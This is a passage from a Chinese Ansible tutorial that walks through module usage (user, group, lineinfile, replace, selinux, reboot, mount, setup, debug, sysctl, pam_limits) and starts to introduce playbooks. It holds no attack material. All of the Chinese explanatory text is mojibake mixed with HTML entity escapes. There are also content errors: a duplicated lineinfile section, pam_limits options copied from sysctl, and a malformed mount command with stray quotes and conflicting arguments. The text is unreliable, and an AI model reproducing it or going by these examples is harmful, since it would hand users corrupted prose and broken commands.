}}\u0026#39; localhost | SUCCESS =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.\u0026#34; } # åˆ›å»ºç”¨æˆ·å¹¶æŒ‡å®šå¯†ç ï¼ˆå¦‚æœç›´æ¥æŒ‡å®šæ˜æ–‡å¯†ç ï¼Œæ‰§è¡Œè™½ç„¶æˆåŠŸï¼Œä½†æ˜¯ç™»å½•æ—¶ä¼šæŠ¥å¯†ç é”™è¯¯ï¼‰ ansible remote -m user -a \u0026#39;name=test2 shell=/bin/bash password=$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.\u0026#39; # åˆ›å»ºç”¨æˆ·å¹¶ç”Ÿæˆ 2048 bit çš„ç”¨æˆ·ç§é’¥ ansible remote -m user -a \u0026#39;name=test3 generate_ssh_key=yes ssh_key_bits=2048 ssh_key_file=.ssh/id_rsa\u0026#39; 2.4.17 group æ¨¡å— æ­¤æ¨¡å—ç”¨äºç®¡ç†ç”¨æˆ·ç»„\nå¸¸è§é€‰é¡¹\nname # æŒ‡å®šç»„åç§° gid # æŒ‡å®šgid state =present # åˆ›å»º, é»˜è®¤ =absent # åˆ é™¤ èŒƒä¾‹ï¼š\n# åˆ›å»ºç³»ç»Ÿç”¨æˆ·ç»„ ansible remote -m group -a \u0026#39;name=test system=yes\u0026#39; # åˆ é™¤ç»„ ansible remote -m group -a \u0026#39;name=test state=absent\u0026#39; 2.4.18 lineinfile æ¨¡å—\næ­¤æ¨¡å—ç›¸å½“äº sed ï¼Œç”¨äºå¯¹æ–‡æœ¬è¿›è¡Œå•è¡Œæ›¿æ¢ã€‚ä¹‹æ‰€ä»¥ä¸ç”¨ sed ï¼Œæ˜¯å› ä¸º ansible å¯¹ç‰¹æ®Šç¬¦å·çš„æ”¯æŒä¸å¼ºï¼Œå®é™…æ“ä½œæ—¶å¯èƒ½æ— æ³•æ›¿æ¢ï¼Œä¸”éœ€è¦å¯¹ç¬¦å·è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚\nå¸¸è§é€‰é¡¹\npath # è¢«æ§ç«¯æ–‡ä»¶çš„è·¯å¾„ regexp # æ­£åˆ™åŒ¹é…å­—ç¬¦ä¸² line # æ›¿æ¢çš„ç›®æ ‡å†…å®¹ state # absent è¡¨ç¤ºåˆ é™¤ insertafter # æ’å…¥åˆ°åŒ¹é…è¡Œå‰ insertbefore # æ’å…¥åˆ°åŒ¹é…è¡Œå backrefs # æ˜¯å¦æ”¯æŒåå‘å¼•ç”¨ backup # ä¿®æ”¹å‰å…ˆå¤‡ä»½ create # å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, åˆ™åˆ›å»º, é»˜è®¤ä¸å­˜åœ¨ä¼šå‡ºé”™ mode # æŒ‡å®šæƒé™ owner # æŒ‡å®šç”¨æˆ· group # æŒ‡å®šç»„ # æ³¨æ„ # regexpå‚æ•°ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¯¹åº”çš„è¡Œï¼Œå½“æ›¿æ¢æ–‡æœ¬æ—¶ï¼Œå¦‚æœåŒ¹é…åˆ°äº†å¤šè¡Œï¼Œåªæœ‰æœ€åä¸€ä¸ªåŒ¹é…è¡Œä¼šè¢«æ›¿æ¢ã€‚å½“åˆ é™¤æ–‡æœ¬æ—¶ï¼Œæ‰€æœ‰åŒ¹é…åˆ°çš„è¡Œéƒ½ä¼šè¢«åˆ é™¤ã€‚ èŒƒä¾‹ï¼š\n# ä¿®æ”¹ httpd æœåŠ¡çš„ç›‘å¬ç«¯å£ ansible remote -m lineinfile -a \u0026#39;path=/etc/httpd/conf/httpd.conf regexp=\u0026#34;^Listen\u0026#34; line=\u0026#34;Listen 8080\u0026#34;\u0026#39; # ç¦ç”¨ selinux ansible remote -m lineinfile -a \u0026#39;path=/etc/selinux/config regexp=\u0026#34;^SELINUX=\u0026#34; line=\u0026#34;SELINUX=disabled\u0026#34;\u0026#39; # æ·»åŠ ç½‘å…³ ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34;\u0026#39; # åœ¨æœ€åä¸€è¡Œæ·»åŠ ç½‘å…³é…ç½® ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34;\u0026#39; # éªŒè¯æ·»åŠ ç»“æœ [root@ansible ~]# ansible remote -a \u0026#39;tail -n1 /etc/sysconfig/network-scripts/ifcfg-ens33\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; GATEWAY=10.0.0.254 # åˆ é™¤æ·»åŠ çš„ç½‘å…³é…ç½® ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34; state=absent\u0026#39; # æ·»åŠ ä¸€ä¸ªç½‘å…³ï¼Œåœ¨ \u0026#34;NAME=\u0026#34; è¯¥è¡Œå‰æ·»åŠ  ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34; insertbefore=\u0026#34;^NAME=\u0026#34;\u0026#39; # æŸ¥çœ‹æ·»åŠ ç»“æœ [root@ansible ~]# ansible remote -a \u0026#39;grep -i gateway /etc/sysconfig/network-scripts/ifcfg-ens33 -A 1\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; GATEWAY=10.0.0.254 NAME=\u0026#34;ens33\u0026#34; 2.4.18 lineinfile æ¨¡å— æ­¤æ¨¡å—ä¸»è¦ç”¨äºåŸºäºæ­£åˆ™çš„å•è¡Œæ–‡æœ¬åŒ¹é…å’Œæ›¿æ¢\nansible å¯¹ç‰¹æ®Šç¬¦å·çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œå¦‚æœç”¨ sed è¿›è¡Œå¤æ‚å­—ç¬¦æ›¿æ¢å¾ˆå¯èƒ½å‡ºç°é—®é¢˜ï¼Œå› æ­¤åœ¨è¿›è¡Œæ–‡æœ¬æ›¿æ¢æ—¶ï¼Œæœ€å¥½ç”¨è¯¥æ¨¡å—è€Œésed\nå¸¸è§é€‰é¡¹\npath #è¢«æ§ç«¯æ–‡ä»¶çš„è·¯å¾„ regexp #æ­£åˆ™åŒ¹é…è¯­æ³•æ ¼å¼,è¡¨ç¤ºè¢«æ›¿æ¢çš„å†…å®¹ line #æ›¿æ¢ä¸ºçš„å†…å®¹ state #absentè¡¨ç¤ºåˆ é™¤ insertafter #æ’å…¥åŒ¹é…è¡Œå insertbefore #æ’å…¥åŒ¹é…è¡Œå‰ backrefs #æ”¯æŒåå‘å¼•ç”¨, yes å’Œ no backup #ä¿®æ”¹å‰å…ˆå¤‡ä»½ create #å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, åˆ™åˆ›å»º, é»˜è®¤ä¸å­˜åœ¨ä¼šå‡ºé”™ mode #æŒ‡å®šæƒé™ owner #æŒ‡å®šç”¨æˆ· group #æŒ‡å®šç»„ #æ³¨æ„ regexp å‚æ•°ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¯¹åº”çš„è¡Œï¼Œæœ‰ä¸¤ç§å¤„ç†æ–¹å¼ å½“æ›¿æ¢æ–‡æœ¬æ—¶ï¼Œå¦‚æœæœ‰å¤šä¸ªåŒ¹é…è¡Œï¼Œåˆ™åªä¼šå¯¹æœ€åä¸€è¡Œè¿›è¡Œæ›¿æ¢ å½“åˆ é™¤æ–‡æœ¬æ—¶ï¼Œå¦‚æœæœ‰å¤šè¡Œæ–‡æœ¬éƒ½èƒ½è¢«åŒ¹é…ï¼Œè¿™ä¹ˆè¿™äº›è¡Œéƒ½ä¼šè¢«åˆ é™¤ã€‚ èŒƒä¾‹ï¼š\n# å…³é—­ selinux ansible remote -m lineinfile -a \u0026#34;path=/etc/selinux/config regexp=\u0026#39;^SELINUX=\u0026#39; line=\u0026#39;SELINUX=disabled\u0026#39;\u0026#34; # æ·»åŠ  DNS é…ç½®ï¼ˆæœ€åä¸€è¡Œï¼‰ ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;DNS1=8.8.8.8\u0026#34;\u0026#39; # æ·»åŠ  DNS é…ç½®ï¼ˆåŒ¹é…è¡Œä¸‹æ·»åŠ ï¼‰ ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 insertafter=\u0026#34;^NAME\u0026#34; line=\u0026#34;DNS1=8.8.8.8\u0026#34;\u0026#39; # åˆ é™¤ä¸€è¡Œ ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;DNS1=8.8.8.8\u0026#34; state=\u0026#34;absent\u0026#34;\u0026#39; # åˆ é™¤æ³¨é‡Šè¡Œ ansible remote -m lineinfile -a \u0026#39;dest=/etc/fstab state=absent regexp=\u0026#34;^#\u0026#34;\u0026#39; ### å¤šè¡Œç›¸åŒæ–‡æœ¬ï¼Œåªæ›¿æ¢æœ€åä¸€è¡Œ [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; a a a [root@ansible ~]# ansible remote -m lineinfile -a \u0026#34;path=/root/test.txt regexp=\u0026#39;a\u0026#39; line=\u0026#39;b\u0026#39;\u0026#34; remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;backup\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;changed\u0026#34;: true, \u0026#34;msg\u0026#34;: \u0026#34;line replaced\u0026#34; } [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; a a b 2.4.19 replace æ¨¡å— è¯¥æ¨¡å—ä¸ sed ç±»ä¼¼ï¼Œä¸»è¦ç”¨äºåŸºäºæ­£åˆ™çš„å¤šè¡Œæ–‡æœ¬åŒ¹é…å’Œæ›¿æ¢\nå¸¸è§é€‰é¡¹\npath # è¢«æ§ç«¯æ–‡ä»¶çš„è·¯å¾„ regexp # æ­£åˆ™åŒ¹é…è¯­æ³•æ ¼å¼ replace # ç›®æ ‡æ›¿æ¢å†…å®¹ after # æ’å…¥åŒ¹é…è¡Œå before # æ’å…¥åŒ¹é…è¡Œå‰ backup # ä¿®æ”¹å‰å…ˆå¤‡ä»½ mode # æŒ‡å®šæƒé™ owner # æŒ‡å®šç”¨æˆ· group # æŒ‡å®šç»„ èŒƒä¾‹ï¼š\nansible remote -m replace -a \u0026#34;path=/etc/fstab regexp=\u0026#39;^(UUID.*)\u0026#39; replace=\u0026#39;#\\1\u0026#39;\u0026#34; ansible remote -m replace -a \u0026#34;path=/etc/fstab regexp=\u0026#39;^#(UUID.*)\u0026#39; replace=\u0026#39;\\1\u0026#39;\u0026#34; ### å¤šè¡ŒåŒ¹é…æ›¿æ¢ [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; b b b [root@ansible ~]# ansible remote -m replace -a \u0026#34;path=/root/test.txt regexp=\u0026#39;b\u0026#39; replace=\u0026#39;a\u0026#39;\u0026#34; remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: true, \u0026#34;msg\u0026#34;: \u0026#34;2 replacements made\u0026#34; } [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; a a a 2.4.20 selinux æ¨¡å— è¯¥æ¨¡å—ç”¨æ¥ç®¡ç† selinux ç­–ç•¥ã€‚æ ¹æ®å›½å†…ä½¿ç”¨ä¹ æƒ¯ï¼Œè¿™é‡Œä¸»è¦æ¼”ç¤ºå¦‚ä½•å…³é—­ selinux\nå¸¸è§é€‰é¡¹\npolicy # æŒ‡å®šSELINUXTYPE=targeted state # æŒ‡å®šSELINUX=disabled èŒƒä¾‹ï¼š\n[root@ansible ~]# ansible remote -m selinux -a \u0026#39;state=disabled\u0026#39; [WARNING]: SELinux state temporarily changed from \u0026#39;enforcing\u0026#39; to \u0026#39;permissive\u0026#39;. State change will take effect next reboot. remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: true, \u0026#34;configfile\u0026#34;: \u0026#34;/etc/selinux/config\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;policy\u0026#34;: \u0026#34;targeted\u0026#34;, \u0026#34;reboot_required\u0026#34;: true, \u0026#34;state\u0026#34;: \u0026#34;disabled\u0026#34; } [root@ansible ~]# ansible remote -a \u0026#34;grep -v \u0026#39;#\u0026#39; /etc/selinux/config\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; SELINUX=disabled SELINUXTYPE=targeted [root@ansible ~]# ansible remote -a \u0026#34;getenforce\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; Permissive 2.4.21 reboot æ¨¡å— ç”¨äºé‡å¯ç›®æ ‡æœºå™¨\nå¸¸è§é€‰é¡¹\nmsg # é‡å¯æç¤ºå†…å®¹ pre_reboot_delay # é‡å¯å‰çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ï¼šs post_reboot_delay # é‡å¯åç»è¿‡å¤šå°‘æ—¶é—´å†éªŒè¯ç³»ç»ŸåŠŸèƒ½æ˜¯å¦æ­£å¸¸ï¼Œå•ä½ï¼šs reboot_timeout #é‡å¯åå»¶è¿Ÿæ—¶é—´å†æ‰§è¡Œæµ‹è¯•æˆåŠŸä¸å¦çš„å‘½ä»¤ test_command #æ‰§è¡Œæµ‹è¯•æˆåŠŸä¸å¦çš„å‘½ä»¤ èŒƒä¾‹ï¼šé‡å¯ç³»ç»Ÿï¼Œä¼šé˜»å¡ç­‰å¾…é‡å¯å®Œæˆæ‰ä¼šè¿”å›æ‰§è¡Œç»“æœ\n[root@ansible ~]# ansible remote -m reboot -a \u0026#34;msg=\u0026#39;host will be reboot\u0026#39;\u0026#34; remote | CHANGED =\u0026gt; { \u0026#34;changed\u0026#34;: true, \u0026#34;elapsed\u0026#34;: 17, \u0026#34;rebooted\u0026#34;: true } 2.4.22 mount æ¨¡å— ç”¨äºæ–‡ä»¶ç³»ç»Ÿçš„ç®¡ç†\nå¸¸è§é€‰é¡¹\nsrc #æºè®¾å¤‡è·¯å¾„ï¼Œæˆ–ç½‘ç»œåœ°å€ path #æŒ‚è½½è‡³æœ¬åœ°å“ªä¸ªè·¯å¾„ä¸‹ fstype #è®¾å¤‡ç±»å‹ opts #æŒ‚è½½çš„é€‰é¡¹ state #æŒ‚è½½è¿˜æ˜¯å¸è½½ =present #æ°¸ä¹…æŒ‚è½½ï¼Œä½†æ²¡æœ‰ç«‹å³ç”Ÿæ•ˆ =absent #å¸è½½ä¸´æ—¶æŒ‚è½½,å¹¶åˆ é™¤æ°¸ä¹…æŒ‚è½½ =mounted #ä¸´æ—¶æŒ‚è½½ =unmounted #ä¸´æ—¶å¸è½½ èŒƒä¾‹ï¼š\n# æ°¸ä¹…å¸è½½ [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app state=absent\u0026#39; # æ°¸ä¹…æŒ‚è½½ï¼Œä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œä»…ä¿®æ”¹/etc/fstab æ–‡ä»¶ [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app state=absent\u0026#39; fstype=xfs opts=noatime path=swap state=present\u0026#39; # ä¸´æ—¶æŒ‚è½½ [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app fstype=xfs opts=default state=mounted\u0026#39; # ä¸´æ—¶å¸è½½ [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app fstype=xfs opts=default state=unmounted\u0026#39; opts=noatimeï¼šoptsæ˜¯ä¼ é€’ç»™mountå‘½ä»¤çš„é¢å¤–é€‰é¡¹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯noatimeï¼Œè¡¨ç¤ºåœ¨è¯»å–æ–‡ä»¶æ—¶ï¼Œä¸æ›´æ–°æ–‡ä»¶çš„æœ€åè®¿é—®æ—¶é—´ã€‚è¿™å¯ä»¥æé«˜æ–‡ä»¶ç³»ç»Ÿçš„æ€§èƒ½ã€‚é»˜è®¤æ˜¯ default\n2.4.23 setup æ¨¡å— è¯¥æ¨¡å—ç”¨äºæ”¶é›†ç›®æ ‡ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ï¼Œåœ¨ä½¿ç”¨ ansible æ—¶ï¼Œæ˜¯é»˜è®¤å¯ç”¨çš„ã€‚è¯¥æ¨¡å—æ”¶é›†åˆ°çš„ä¿¡æ¯å¯ä»¥é€šè¿‡å˜é‡å¼•ç”¨ï¼Œä½†æ˜¯é€šå¸¸æƒ…å†µä¸‹ï¼Œå®ƒä¼šå½±å“æ‰§è¡Œé€Ÿåº¦ã€‚å¦‚æœä¸éœ€è¦ï¼Œå¯ä»¥æ˜¾å¼å…³é—­ä»¥æé«˜æ‰§è¡Œæ•ˆç‡ã€‚\nå¯ä»¥ä½¿ç”¨ gather_facts: no æ¥ç¦æ­¢ Ansible æ”¶é›† facts ä¿¡æ¯\nå¸¸è§é€‰é¡¹\nfilter # æŒ‡å®šè¿‡æ»¤æ¡ä»¶ èŒƒä¾‹ï¼š\nansible remote -m setup ansible remote -m setup -a \u0026#34;filter=ansible_nodename\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_hostname\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_domain\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_memtotal_mb\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_memory_mb\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_memfree_mb\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_os_family\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_distribution\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_distribution_major_version\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_distribution_version\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_processor_vcpus\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_remote_ipv4_addresses\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_architecture\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_uptime_seconds\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_processor*\u0026#34; ansible remote -m setup -a \u0026#39;filter=ansible_env\u0026#39; 2.4.24 debug æ¨¡å— æ­¤æ¨¡å—ç”¨äºæ‰“å°ç›¸å…³ä¿¡æ¯ï¼Œç±»ä¼¼äº print å’Œ echo\nå¸¸è§é€‰é¡¹\nmsg\t# æ‰“å°å†…å®¹ var\t# è®¾ç½®å˜é‡å¹¶èµ‹å€¼ verbosity # è¯¦ç»†çº§åˆ« èŒƒä¾‹ï¼šæœªæŒ‡å®šmsgï¼Œé»˜è®¤æ‰“å° hello world\n[root@ansible ~]# ansible remote -m debug remote | SUCCESS =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Hello world!\u0026#34; } èŒƒä¾‹ï¼šæ‰“å°å˜é‡å€¼\n[root@ansible playbooks]# cat debug.yaml --- - hosts: remote gather_facts: yes tasks: - name: print value of variable debug: msg: host \u0026#34;{{ ansible_nodename }}\u0026#34; [root@ansible playbooks]# ansible-playbook debug.yaml PLAY [remote] *************************************************************************************** TASK [Gathering Facts] ****************************************************************************** ok: [remote] TASK [print value of variable] ********************************************************************** ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;host \\\u0026#34;remote\\\u0026#34;\u0026#34; } PLAY RECAP ****************************************************************************************** remote : ok=2 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 èŒƒä¾‹ï¼šé€šè¿‡ä¸‹æ ‡æ‰“å°æŒ‡å®šå¯¹åº”å­—ç¬¦\n[root@ansible playbooks]# cat debug.yaml --- - hosts: remote gather_facts: no vars: str: \u0026#34;01234\u0026#34; tasks: - debug: msg: - \u0026#34;{{ str[0] }}\u0026#34; - \u0026#34;{{ str[1] }}\u0026#34; - \u0026#34;{{ str[2] }}\u0026#34; [root@ansible playbooks]# ansible-playbook debug.yaml PLAY [remote] *************************************************************************************** TASK [debug] **************************************************************************************** ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: [ \u0026#34;0\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34; ] } PLAY RECAP ****************************************************************************************** remote : ok=1 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 2.4.25 sysctl æ¨¡å— æ­¤æ¨¡å—ç”¨äºä¿®æ”¹å†…æ ¸å‚æ•°\nå¸¸è§é€‰é¡¹\nname # å†…æ ¸å‚æ•°å value # æŒ‡å®šå€¼ state # æ˜¯å¦ä¿å­˜åœ¨sysctl.confæ–‡ä»¶ä¸­ï¼Œé»˜è®¤present sysctl_set #ä½¿ç”¨sysctl -w éªŒè¯å€¼ç”Ÿæ•ˆ èŒƒä¾‹ï¼š\n[root@ansible playbooks]# ansible remote -m sysctl -a \u0026#39;name=net.ipv4.ip_forward value=1 state=present\u0026#39; remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: true } [root@ansible playbooks]# ansible remote -a \u0026#39;grep forward /etc/sysctl.conf\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; net.ipv4.ip_forward=1 å…¶ä»–ç¤ºä¾‹ï¼š\n--- - hosts: remote gather_facts: no tasks: - name: Change Port Range sysctl: name: net.ipv4.ip_local_port_range value: \u0026#39;1024 65000\u0026#39; sysctl_set: yes - name: Enabled Forward sysctl: name: net.ipv4.ip_forward value: \u0026#39;1\u0026#39; sysctl_set: yes - name: Enabled tcp_reuse sysctl: name: net.ipv4.tcp_tw_reuse value: \u0026#39;1\u0026#39; sysctl_set: yes - name: Chanage tcp tw_buckets sysctl: name: net.ipv4.tcp_max_tw_buckets value: \u0026#39;5000\u0026#39; sysctl_set: yes - name: Chanage tcp_syncookies sysctl: name: net.ipv4.tcp_syncookies value: \u0026#39;1\u0026#39; sysctl_set: yes - name: Chanage tcp max_syn_backlog sysctl: name: net.ipv4.tcp_max_syn_backlog value: \u0026#39;8192\u0026#39; sysctl_set: yes - name: Chanage tcp Established Maxconn sysctl: name: net.core.somaxconn value: \u0026#39;32768\u0026#39; sysctl_set: yes state: present - name: Chanage tcp_syn_retries sysctl: name: net.ipv4.tcp_syn_retries value: \u0026#39;2\u0026#39; sysctl_set: yes state: present - name: Chanage net.ipv4.tcp_synack_retries sysctl: name: net.ipv4.tcp_synack_retries value: \u0026#39;2\u0026#39; sysctl_set: yes state: present 2.4.26 pam_limits æ¨¡å— æ­¤æ¨¡å—ç”¨äºä¿®æ”¹å†…æ ¸èµ„æºé™åˆ¶\nå¸¸è§é€‰é¡¹\nname\t# å†…æ ¸å‚æ•° value\t# æŒ‡å®šå€¼ state\t# æ˜¯å¦ä¿å­˜åœ¨ sysctl.conf æ–‡ä»¶ä¸­ï¼Œé»˜è®¤ä¿å­˜ sysctl_set # ä½¿ sysctl -w éªŒè¯å€¼ç”Ÿæ•ˆ èŒƒä¾‹ï¼š\nansible remote -m sysctl -a \u0026#39;name=net.ipv4.ip_forward value=1 state=present\u0026#39; èŒƒä¾‹å†…æ ¸å‚æ•°ä¼˜åŒ–ï¼š\n--- - hosts: remote gather_facts: no vars: limits_conf_dest: \u0026#39;/etc/security/limits.conf\u0026#39; tasks: - name: Modify {{ limits_conf_dest }} pam_limits: dest: \u0026#34;{{ limits_conf_dest }}\u0026#34; domain: \u0026#39;*\u0026#39; limit_type: \u0026#34;{{ item.limit_type }}\u0026#34; limit_item: \u0026#34;{{ item.limit_item }}\u0026#34; value: \u0026#34;{{ item.value }}\u0026#34; loop: - { limit_type: \u0026#39;soft\u0026#39;, limit_item: \u0026#39;nofile\u0026#39;, value: \u0026#39;655350\u0026#39; } - { limit_type: \u0026#39;hard\u0026#39;, limit_item: \u0026#39;nofile\u0026#39;, value: \u0026#39;655350\u0026#39; } - { limit_type: \u0026#39;soft\u0026#39;, limit_item: \u0026#39;nproc\u0026#39;, value: \u0026#39;655350\u0026#39; } - { limit_type: \u0026#39;hard\u0026#39;, limit_item: \u0026#39;nproc\u0026#39;, value: \u0026#39;655350\u0026#39; } 3 Ansible Playbook 3.1 Playbook ç®€ä»‹ å®˜ç½‘ï¼šAnsible playbooks â€” Ansible Documentation\nPlaybook æ˜¯ Ansible ä¸­ç”¨äºå®šä¹‰è‡ªåŠ¨åŒ–ä»»åŠ¡çš„æ–‡æœ¬æ–‡ä»¶ã€‚å®ƒæ˜¯ä¸€ç§å£°æ˜æ€§çš„æè¿°æ–¹å¼ï¼Œç”¨äºæŒ‡å®šä¸€ç³»åˆ—æ­¥éª¤å’Œé…ç½®ï¼Œä»¥ä¾¿ Ansible å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œè¿™äº›æ­¥éª¤ã€‚Playbook å¯ä»¥ç”¨äºé…ç½®æœåŠ¡å™¨ã€éƒ¨ç½²åº”ç”¨ç¨‹åºã€ç®¡ç†ç³»ç»Ÿç­‰ä¸€ç³»åˆ—è‡ªåŠ¨åŒ–ä»»åŠ¡ã€‚\nä»¥ä¸‹æ˜¯ Playbook çš„ä¸€äº›é‡è¦ç‰¹ç‚¹å’Œç»„æˆéƒ¨åˆ†ï¼š\nå£°æ˜æ€§æè¿°: Playbook é‡‡ç”¨å£°æ˜æ€§çš„æ–¹å¼æè¿°äº†ä½ è¦æ‰§è¡Œçš„ä»»åŠ¡ï¼Œè€Œä¸éœ€è¦è¯¦ç»†è¯´æ˜æ¯ä¸ªæ­¥éª¤çš„æ‰§è¡Œè¿‡ç¨‹ã€‚\nYAML æ ¼å¼: Playbook æ˜¯ç”¨ YAMLï¼ˆYet Another Markup Languageï¼‰æ ¼å¼ç¼–å†™çš„ã€‚YAML æ ¼å¼å…·æœ‰è‰¯å¥½çš„å¯è¯»æ€§ï¼Œä½¿å¾— Playbook æ›´æ˜“äºç†è§£å’Œç¼–å†™ã€‚\nä¸»æœºæ¸…å•: åœ¨ Playbook ä¸­ï¼Œä½ å¯ä»¥æŒ‡å®šè¦æ‰§è¡Œä»»åŠ¡çš„ç›®æ ‡ä¸»æœºã€‚è¿™é€šå¸¸é€šè¿‡æ¸…å•æ–‡ä»¶æ¥å®ç°ï¼Œæ¸…å•æ–‡ä»¶åˆ—å‡ºäº†è¦æ‰§è¡Œä»»åŠ¡çš„è¿œç¨‹ä¸»æœºã€‚\nä»»åŠ¡: Playbook ç”±ä¸€ä¸ªæˆ–å¤šä¸ªä»»åŠ¡ç»„æˆï¼Œæ¯ä¸ªä»»åŠ¡æè¿°äº†ä¸€ä¸ªç‰¹å®šçš„æ“ä½œï¼Œå¦‚è¿è¡Œå‘½ä»¤ã€å¤åˆ¶æ–‡ä»¶ã€å®‰è£…è½¯ä»¶ç­‰ã€‚\næ¨¡å—: ä»»åŠ¡ä½¿ç”¨æ¨¡å—æ¥æ‰§è¡Œå®é™…çš„æ“ä½œã€‚æ¨¡å—æ˜¯ Ansible åŠŸèƒ½çš„æ„å»ºå—ï¼Œå®ƒä»¬å°è£…äº†å„ç§ä¸åŒç±»å‹çš„ä»»åŠ¡ï¼Œä¾‹å¦‚è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€æ–‡ä»¶æ“ä½œã€è½¯ä»¶åŒ…ç®¡ç†ç­‰ã€‚\nå˜é‡: ä½ å¯ä»¥åœ¨ Playbook ä¸­ä½¿ç”¨å˜é‡æ¥å­˜å‚¨æ•°æ®ï¼Œå¦‚ä¸»æœºåã€IP åœ°å€ã€é…ç½®é€‰é¡¹ç­‰ã€‚å˜é‡å¯ä»¥æé«˜å¯ç»´æŠ¤æ€§å’Œå¯é‡ç”¨æ€§ã€‚\næ¡ä»¶å’Œå¾ªç¯: Playbook æ”¯æŒæ¡ä»¶è¯­å¥å’Œå¾ªç¯ï¼Œå…è®¸ä½ åœ¨ç‰¹å®šæƒ…å†µä¸‹æ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œæˆ–è€…åœ¨å¤šä¸ªä¸»æœºä¸Šé‡å¤æ‰§è¡Œä»»åŠ¡ã€‚\nè§’è‰²: è§’è‰²æ˜¯ä¸€ç§ç»„ç»‡å’Œå¤ç”¨ Playbook 